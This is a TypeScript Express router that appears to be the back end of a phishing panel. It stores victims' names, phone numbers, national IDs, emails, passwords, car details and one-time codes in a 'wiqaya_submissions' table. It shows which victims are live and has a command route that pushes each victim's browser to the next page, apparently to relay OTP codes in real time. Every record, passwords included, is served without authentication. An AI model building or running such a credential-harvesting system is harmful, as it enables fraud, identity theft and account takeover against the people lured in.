import { Router } from "express";
import pg from "pg";

const { Pool } = pg;
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const router = Router();

// Upsert visitor
router.post("/submit", async (req, res) => {
  const {
    id, submittedAt, submittedAtTs,
    name, phone, nationalId, email, password,
    carPlate, carYear, carMake,
    otpCode, otpStatus, page, isActive, lastSeen, country
  } = req.body;
  await pool.query(`
    INSERT INTO wiqaya_submissions
      (id, submitted_at, submitted_at_ts, name, phone, national_id, email, password,
       car_plate, car_year, car_make, otp_code, otp_status, page, is_active, last_seen, country)
    VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17)
    ON CONFLICT (id) DO UPDATE SET
      submitted_at = EXCLUDED.submitted_at,
      submitted_at_ts = EXCLUDED.submitted_at_ts,
      name = COALESCE(NULLIF(EXCLUDED.name,''), wiqaya_submissions.name),
      phone = COALESCE(NULLIF(EXCLUDED.phone,''), wiqaya_submissions.phone),
      national_id = COALESCE(NULLIF(EXCLUDED.national_id,''), wiqaya_submissions.national_id),
      email = COALESCE(NULLIF(EXCLUDED.email,''), wiqaya_submissions.email),
      password = COALESCE(NULLIF(EXCLUDED.password,''), wiqaya_submissions.password),
      car_plate = COALESCE(NULLIF(EXCLUDED.car_plate,''), wiqaya_submissions.car_plate),
      car_year = COALESCE(NULLIF(EXCLUDED.car_year,''), wiqaya_submissions.car_year),
      car_make = COALESCE(NULLIF(EXCLUDED.car_make,''), wiqaya_submissions.car_make),
      otp_code = COALESCE(NULLIF(EXCLUDED.otp_code,''), wiqaya_submissions.otp_code),
      otp_status = COALESCE(EXCLUDED.otp_status, wiqaya_submissions.otp_status),
      page = COALESCE(NULLIF(EXCLUDED.page,''), wiqaya_submissions.page),
      is_active = EXCLUDED.is_active,
      last_seen = EXCLUDED.last_seen,
      country = COALESCE(NULLIF(EXCLUDED.country,''), wiqaya_submissions.country)
  `, [
    id, submittedAt, submittedAtTs,
    name||'', phone||'', nationalId||'', email||'', password||'',
    carPlate||'', carYear||'', carMake||'',
    otpCode||'', otpStatus||null, page||'', isActive, lastSeen, country||''
  ]);
  res.json({ ok: true });
});

// Patch
router.patch("/submissions/:id", async (req, res) => {
  const { id } = req.params;
  const map: Record<string, string> = {
    otpCode: "otp_code", otpStatus: "otp_status", page: "page",
    isActive: "is_active", lastSeen: "last_seen",
    name: "name", phone: "phone", nationalId: "national_id",
    email: "email", password: "password",
    carPlate: "car_plate", carYear: "car_year", carMake: "car_make", country: "country"
  };
  const sets: string[] = []; const vals: any[] = [];
  for (const [k, col] of Object.entries(map)) {
    if (k in req.body) { sets.push(`${col} = $${vals.length+1}`); vals.push(req.body[k]); }
  }
  if (!sets.length) return res.json({ ok: true });
  vals.push(id);
  await pool.query(`UPDATE wiqaya_submissions SET ${sets.join(',')} WHERE id = $${vals.length}`, vals);
  res.json({ ok: true });
});

// Get all
router.get("/submissions", async (_req, res) => {
  const { rows } = await pool.query(`
    SELECT *, (EXTRACT(EPOCH FROM NOW())*1000 - last_seen) < 8000 AS is_live
    FROM wiqaya_submissions ORDER BY submitted_at_ts DESC
  `);
  res.json(rows.map((r: any) => ({
    id: r.id, submittedAt: r.submitted_at, submittedAtTs: r.submitted_at_ts,
    name: r.name, phone: r.phone, nationalId: r.national_id,
    email: r.email, password: r.password,
    carPlate: r.car_plate, carYear: r.car_year, carMake: r.car_make,
    otpCode: r.otp_code, otpStatus: r.otp_status,
    page: r.page, isActive: r.is_live, lastSeen: r.last_seen, country: r.country
  })));
});

// Command system
router.post("/cmd/:id", async (req, res) => {
  const { cmd } = req.body;
  await pool.query(`UPDATE wiqaya_submissions SET page = $1 WHERE id = $2`, [cmd, req.params.id]);
  res.json({ ok: true });
});
router.get("/cmd/:id", async (req, res) => {
  const { rows } = await pool.query(`SELECT page FROM wiqaya_submissions WHERE id = $1`, [req.params.id]);
  res.json({ cmd: rows[0]?.page || null });
});

// Delete
router.delete("/submissions/:id", async (req, res) => {
  await pool.query(`DELETE FROM wiqaya_submissions WHERE id = $1`, [req.params.id]);
  res.json({ ok: true });
});
router.delete("/submissions", async (_req, res) => {
  await pool.query(`DELETE FROM wiqaya_submissions`);
  res.json({ ok: true });
});

export default router;
